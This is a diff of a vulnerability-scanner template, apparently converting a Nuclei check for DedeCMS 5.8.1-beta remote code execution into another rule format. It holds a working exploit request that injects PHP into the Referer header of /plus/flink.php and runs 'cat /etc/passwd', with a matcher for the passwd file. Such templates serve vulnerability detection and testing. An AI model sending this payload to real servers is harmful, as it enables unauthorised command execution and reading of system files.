@@ -1,32 +1,31 @@
 id: dedecms-rce
 
 info:
-  name: DedeCMS v5.8.1-beta - Remote Code Execution
+  name: DedeCMS 5.8.1-beta - Remote Code Execution
   author: ritikchaddha
   severity: critical
+  verified: false
   description: |
-    The vulnerability is due to a variable override vulnerability in DedeCMS that allows an attacker to construct malicious code with template file inclusion without authorization to cause remote command execution attacks and ultimately gain the highest privileges on the server.
+    DedeCMS 5.8.1-beta is susceptible to remote code execution via a variable override vulnerability that allows an attacker to construct malicious code with template file inclusion without proper authorization, thus possibly obtaining sensitive information, modifying data, and/or gaining full control over a compromised system without entering necessary credentials.
+    app="DedeCMS"
   reference:
     - https://srcincite.io/blog/2021/09/30/chasing-a-dream-pwning-the-biggest-cms-in-china.html
     - https://sectime.top/post/1d114771.html
-  metadata:
-    verified: true
-    fofa-query: app="DedeCMS"
-  tags: dedecms,cms,rce
 
-requests:
-  - raw:
-      - |
+set:
+  hostname: request.url.host
+rules:
+  r0:
+    # request:
+    #   method: GET
+    #   path: /plus/flink.php?dopost=save&c=cat%20/etc/passwd
+    #   headers:
+    #     Referer: '<?php "system"($c);die;/*ref'
+    request:
+      raw: |
         GET /plus/flink.php?dopost=save&c=cat%20/etc/passwd HTTP/1.1
-        Host: {{Hostname}}
+        Host: {{hostname}}
         Referer: <?php "system"($c);die;/*ref
-
-    matchers-condition: and
-    matchers:
-      - type: regex
-        regex:
-          - "root:[x*]:0:0"
-
-      - type: status
-        status:
-          - 200
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0
+    expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
+expression: r0()
